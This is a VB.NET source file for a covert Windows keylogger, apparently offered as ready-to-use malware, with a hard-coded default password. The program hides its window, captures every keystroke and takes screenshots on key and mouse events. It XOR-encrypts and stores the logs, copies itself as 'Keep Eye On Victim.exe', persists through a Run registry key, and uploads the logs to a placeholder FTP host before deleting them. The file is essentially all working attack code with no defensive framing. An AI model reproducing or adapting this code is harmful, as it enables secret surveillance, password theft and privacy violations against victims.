Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Net.Sockets
Imports System.IO
Imports System.IO.Compression
Public Class Form1
    Public Inputs As String = ""
    Public Event OnOk()
    Public Password As String = "Password"
    Public Thread1 As New Threading.Thread(AddressOf Keepingeye)
    Public Sub Keepingeye()
        Try
Start:
            Do
                    If Inputs.Length > 0 Then
                        If MouseButtons = Windows.Forms.MouseButtons.XButton1 Then
                            RaiseEvent OnOk()
                        ElseIf GetAsyncKeyState(Keys.Enter) Then
                            RaiseEvent OnOk()
                        ElseIf MouseButtons = Windows.Forms.MouseButtons.XButton2 Then
                            RaiseEvent OnOk()
                        ElseIf MouseButtons = Windows.Forms.MouseButtons.Right Then
                            RaiseEvent OnOk()
                        ElseIf MouseButtons = Windows.Forms.MouseButtons.Left Then
                            RaiseEvent OnOk()
                        ElseIf MouseButtons = Windows.Forms.MouseButtons.Middle Then
                            RaiseEvent OnOk()
                        End If
                    End If
                SaveMe()
                RegisterKey()
                Threading.Thread.Sleep(10)
            Loop
        Catch ex As Exception
            Threading.Thread.Sleep(10)
            GoTo Start
        End Try
    End Sub
    Public Sub OkSave()
        Try
            Save()
            Inputs = ""
        Catch ex As Exception
        End Try
    End Sub
    Public Sub OnkeyPressed(ByVal Key As Keys, ByVal Character As Char)
        Try
            If Key = Keys.Back Then
                Try
                    Inputs += Chr(Keys.Back)
                    If Inputs.Length > 0 Then
                        For Each c As Char In Inputs
                            If c = Chr(Keys.Back) Then
                                If Inputs.IndexOf(c) = 0 Then
                                    Inputs = Inputs.Remove(Inputs.IndexOf(c), 1)
                                Else
                                    Inputs = Inputs.Remove(Inputs.IndexOf(c) - 1, 2)
                                End If
                            End If
                        Next
                    End If
                Catch ex As Exception
                End Try
            Else
                If Character <> Chr(0) And Character <> Chr(13) Then
                    Inputs += Character
                End If
            End If
        Catch
        End Try
    End Sub
    Public Sub RegisterKey()
        Try
            Dim folder1 = Environment.GetFolderPath(Environment.SpecialFolder.Programs)
            Dim regkey As Microsoft.Win32.RegistryKey
            regkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SoftWare\Microsoft\Windows\CurrentVersion\Run", True)
            regkey.SetValue("Keep Eye On Victim.exe", folder1 + "\Keep Eye On Victim.exe")
            regkey.Close()
        Catch ex As Exception
        End Try
    End Sub
    <DllImport("user32.dll")>
    Public Shared Function GetAsyncKeyState(ByVal vKey As Keys) As Short
    End Function
    Public Shared Function encrypt(ByVal Data As Byte(), ByVal Password As String) As Byte()
        Dim Encrypted(Data.Count - 1) As Byte
        Dim Passpos As Integer
        Dim Passchar As Char
        Dim b As Integer
        Dim a As Integer
        For i = 0 To Data.Count - 1
            Passpos = CircularPositionPositive(i, Password.Count - 1)
            Passchar = Password(Passpos)
            b = Asc(Passchar)
            a = Data(i)
            Encrypted(i) = a Xor b
        Next
        Return Encrypted
    End Function
    Public Shared Function CircularPositionPositive(ByVal Current As Integer, ByVal Max As Integer) As Integer
        Dim value = ((Current / Max) - Math.Truncate(Current / Max)) * Max
        If value < 0 Then
            value = Max + value
        End If
        Return value
    End Function
    Public Shared Function Compress(ByVal Raw As Byte()) As Byte()
        Using Stream As IO.MemoryStream = New IO.MemoryStream
            Using Stream2 As IO.Compression.GZipStream = New IO.Compression.GZipStream(Stream, IO.Compression.CompressionMode.Compress, True)
                Stream2.Write(Raw, 0, Raw.Length)
            End Using
            Return Stream.ToArray()
        End Using
    End Function
    Public Shared Function Decrypt(ByVal Data As Byte(), ByVal Password As String) As Byte()
        Dim Encrypted(Data.Count - 1) As Byte
        Dim Passpos As Integer
        Dim Passchar As Char
        Dim b As Integer
        Dim a As Integer
        For i = 0 To Data.Count - 1
            Passpos = CircularPositionPositive(i, Password.Count - 1)
            Passchar = Password(Passpos)
            b = Asc(Passchar)
            a = Data(i)
            Encrypted(i) = a Xor b
        Next
        Return Encrypted
    End Function
    Public Shared Function Now() As String
        Return DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss.ffff").Replace("/", "_").Replace(":", "_").Replace(" ", "_").Replace(".", "_").Replace("-", "_")
    End Function
    Public Sub Save()
        Try
            Dim Folder As String = Environment.GetFolderPath(Environment.SpecialFolder.Programs)
            If IO.Directory.Exists(Folder + "\Windows Operator") Then
            Else
                IO.Directory.CreateDirectory(Folder + "\Windows Operator")
            End If
            Dim Bytes() As Byte = System.Text.Encoding.Default.GetBytes(Inputs)
            Dim md5 As String
            md5 = Password
            Dim Compressed() As Byte = Compress(Bytes)
            Dim Encrypted() As Byte = encrypt(Compressed, md5)
            Dim Namef As String = Now.ToString
            Dim img As New Bitmap(Captureit())
            Dim Stream As New MemoryStream()
            img.Save(Stream, Imaging.ImageFormat.Bmp)
            Dim Bytes1() As Byte = Stream.GetBuffer
            Dim md51 As String
            md51 = Password
            Dim Compressed1() As Byte = Compress(Bytes1)
            Dim Encrypted1() As Byte = encrypt(Compressed1, md51)
            Dim Stream1 As New IO.FileStream(Folder + "\Windows Operator\" + Namef.ToString + "Comb.Xml", IO.FileMode.Create)
            Dim Writer As New BinaryWriter(Stream1)
            Writer.Write(Encrypted.Length.ToString)
            Writer.Write(Encrypted)
            Writer.Write(Encrypted1.Length.ToString)
            Writer.Write(Encrypted1)
            Writer.Flush()
            Writer.Dispose()
            Stream.Dispose()
            Inputs = ""
        Catch ex As Exception
        End Try
    End Sub
    Public Sub Send()
        Try
            Dim Folder As String = Environment.GetFolderPath(Environment.SpecialFolder.Programs)
            Dim Path As String = Folder + "\Windows Operator"
            Dim Website_ftp As String = "ftp://ftp.yourwebsite.com"
            Dim ftp_username As String = "username"
            Dim ftp_password As String = "Password"
            Dim KeyLoggs() As String = IO.Directory.GetFiles(Path)
            If KeyLoggs.Count <> 0 Then
                Dim DataDirectory As String = "/KeyLoggs/" & Now.ToString & "Comb.Xml"
                Dim req = Net.WebRequest.Create(Website_ftp + DataDirectory)
                req.Method = Net.WebRequestMethods.Ftp.UploadFile
                req.Credentials = New Net.NetworkCredential(ftp_username, ftp_password)
                For Each KeyLogg As String In KeyLoggs
                    Dim Bytes() As Byte = IO.File.ReadAllBytes(KeyLogg)
                    Using o = req.GetRequestStream
                        Dim Writer As New IO.BinaryWriter(o)
                        Writer.Write(Bytes)
                        Writer.Flush()
                        IO.File.Delete(KeyLogg)
                    End Using
                Next
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Public Shared Function Decompress(ByVal gZip As Byte()) As Byte()
        Dim buffer As Byte()
        Using Stream As IO.Compression.GZipStream = New IO.Compression.GZipStream(New IO.MemoryStream(gZip), IO.Compression.CompressionMode.Decompress)
            Dim Array As Byte() = New Byte(&H1000 - 1) {}
            Using Stream2 As IO.MemoryStream = New IO.MemoryStream
                Dim Count As Integer = 0
                Do
                    Count = Stream.Read(Array, 0, &H1000)
                    If Count > 0 Then
                        Stream2.Write(Array, 0, Count)
                    End If
                Loop While (Count > 0)
                buffer = Stream2.ToArray
            End Using
        End Using
        Return buffer
    End Function
    Public Shared Function Captureit() As Drawing.Image
        Dim Bmp As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Using g As Graphics = Graphics.FromImage(Bmp)
            g.CopyFromScreen(0, 0, 0, 0, Bmp.Size)
        End Using
        Return Bmp
    End Function
    Public Sub SaveMe()
        Try
            Dim File = IO.File.ReadAllBytes(Application.ExecutablePath)
            Dim folder = Environment.GetFolderPath(Environment.SpecialFolder.Programs)
            If IO.File.Exists(folder + "/Keep Eye On Victim.exe") Then
            Else
                Dim Stream As New FileStream(folder + "/Keep Eye On Victim.exe", FileMode.Create)
                Dim Writer As New BinaryWriter(Stream)
                Writer.Write(File)
                Writer.Flush()
            End If
        Catch
        End Try
    End Sub
    Private Sub Form1_Load_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Me.ShowIcon = False
            Me.ShowInTaskbar = False
            Me.Hide()
            Thread1.Start()
            Timer1.Interval = 1
            Timer1.Start()
            AddHandler OnOk, AddressOf OkSave
            Dim keyLogger As New Class1
            AddHandler keyLogger.OnKeyPressed, AddressOf OnkeyPressed
            keyLogger.Start()
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Send()
    End Sub
End Class
Public Class Class1
    Implements IDisposable

#Region "IDisposable Support"
    Private disposedValue As Boolean ' To detect redundant calls

    ' IDisposable
    Protected Overridable Sub Dispose(ByVal disposing As Boolean)
        If Not Me.disposedValue Then
            If disposing Then
                ' TODO: dispose managed state (managed objects).
            End If

            ' TODO: free unmanaged resources (unmanaged objects) and override Finalize() below.
            ' TODO: set large fields to null.
        End If
        Me.disposedValue = True
    End Sub

    ' TODO: override Finalize() only if Dispose(ByVal disposing As Boolean) above has code to free unmanaged resources.
    'Protected Overrides Sub Finalize()
    '    ' Do not change this code.  Put cleanup code in Dispose(ByVal disposing As Boolean) above.
    '    Dispose(False)
    '    MyBase.Finalize()
    'End Sub

    ' This code added by Visual Basic to correctly implement the disposable pattern.
    Public Sub Dispose() Implements IDisposable.Dispose
        ' Do not change this code.  Put cleanup code in Dispose(ByVal disposing As Boolean) above.
        Dispose(True)
        GC.SuppressFinalize(Me)
    End Sub
#End Region
    Public Const SleepTime As Integer = 10
    Public DownMap As New List(Of Keys)
    Public Event OnKeyPressed(ByVal key As Keys, ByVal Character As Char)
    Public Property _IsDisposed As Boolean
    Public Property _IsRunning As Boolean
    Public Thread As New Threading.Thread(AddressOf Work)
    Public Sub Start()
        _IsRunning = True
    End Sub
    Public Sub [Stop]()
        _IsRunning = False
    End Sub
    Private Sub Work()
        Do
            Dim KeyBoardState(256 - 1) As Byte
            Dim Buffer As New StringBuilder(256)
            If _IsDisposed Then
                Exit Do
            End If
            If _IsRunning Then
                For Each Key In KeysMap
                    Dim Contains As Boolean = DownMap.Contains(Key)
                    If GetAsyncKeyState(Key) <> 0 Then
                        If Not Contains Then
                            DownMap.Add(Key)
                            Dim IsShift As Boolean = DownMap.Contains(Keys.Shift) Or DownMap.Contains(Keys.LShiftKey) Or DownMap.Contains(Keys.RShiftKey)
                            Dim NumLock As Boolean = Control.IsKeyLocked(Keys.NumLock)
                            Dim CapsLock As Boolean = Control.IsKeyLocked(Keys.CapsLock)
                            Dim ScrollLock As Boolean = Control.IsKeyLocked(Keys.Scroll)
                            For i = 0 To 256 - 1
                                KeyBoardState(i) = 0
                            Next
                            Buffer.Clear()
                            If IsShift Then KeyBoardState(Keys.ShiftKey) = Byte.MaxValue
                            If NumLock Then KeyBoardState(Keys.NumLock) = Byte.MaxValue
                            If CapsLock Then KeyBoardState(Keys.CapsLock) = Byte.MaxValue
                            If ScrollLock Then KeyBoardState(Keys.Scroll) = Byte.MaxValue
                            Dim OutPut As Integer = ToUnicode(Key, 0, KeyBoardState, Buffer, 256, 0)
                            Dim Text As String = Buffer.ToString
                            If Text.Length <> 0 Then
                                RaiseEvent OnKeyPressed(Key, Text(0))
                            Else
                                RaiseEvent OnKeyPressed(Key, Chr(0))
                            End If
                        End If
                    Else
                        If Contains Then DownMap.Remove(Key)
                    End If
                Next
            End If
            Threading.Thread.Sleep(SleepTime)
        Loop
    End Sub
    <DllImport("user32.dll")>
    Public Shared Function GetAsyncKeyState(ByVal vKey As Keys) As Short
    End Function
    <DllImport("user32.dll")>
    Private Shared Function ToUnicode(ByVal VirtualKeyCode As UInteger, ByVal ScanCode As UInteger, ByVal KeyBoardState As Byte(), <Out(), MarshalAs(UnmanagedType.LPWStr, sizeConst:=64)> ByVal recievingBuffer As StringBuilder, ByVal buffersize As Integer, ByVal flags As UInteger) As Integer
    End Function
    Public Sub _Dispose()
        _IsDisposed = True
    End Sub
    Sub New()
        Thread.Start()
    End Sub
    Public Shared Property KeysMap As Keys()
    Shared Sub New()
        KeysMap = [Enum].GetValues(GetType(Keys))
    End Sub
End Class